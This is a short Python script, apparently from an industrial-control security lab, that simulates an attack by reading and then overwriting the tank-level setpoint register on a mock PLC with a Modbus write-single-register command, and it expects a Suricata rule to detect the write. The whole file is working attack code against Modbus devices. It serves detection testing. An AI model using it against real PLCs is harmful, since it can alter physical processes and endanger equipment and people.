"""
Attack: Modbus FC6 — Write Single Register.
Manipulate Setpoint (HR0) — change the target tank level.

Simulates a compromised jump-server pivoting against the PLC.
Suricata rule sid:2000006 should fire on this.
"""
import sys
import time

from pymodbus.client import ModbusTcpClient

PLC = "mock-plc"
NEW_SETPOINT = int(sys.argv[1]) if len(sys.argv) > 1 else 9999

client = ModbusTcpClient(PLC, port=502, timeout=3)
if not client.connect():
    print(f"[ATTACK-FC6] could not connect to {PLC}:502")
    sys.exit(2)

# Read current setpoint first (recon)
rr = client.read_holding_registers(address=0, count=1, slave=1)
old = rr.registers[0] if not rr.isError() else "?"
print(f"[ATTACK-FC6] current Setpoint={old}")

# Write new setpoint
wr = client.write_register(address=0, value=NEW_SETPOINT, slave=1)
if wr.isError():
    print(f"[ATTACK-FC6] write failed: {wr}")
    sys.exit(1)

print(f"[ATTACK-FC6] wrote Setpoint={NEW_SETPOINT} — Suricata sid:2000006 should fire")
time.sleep(0.3)
client.close()
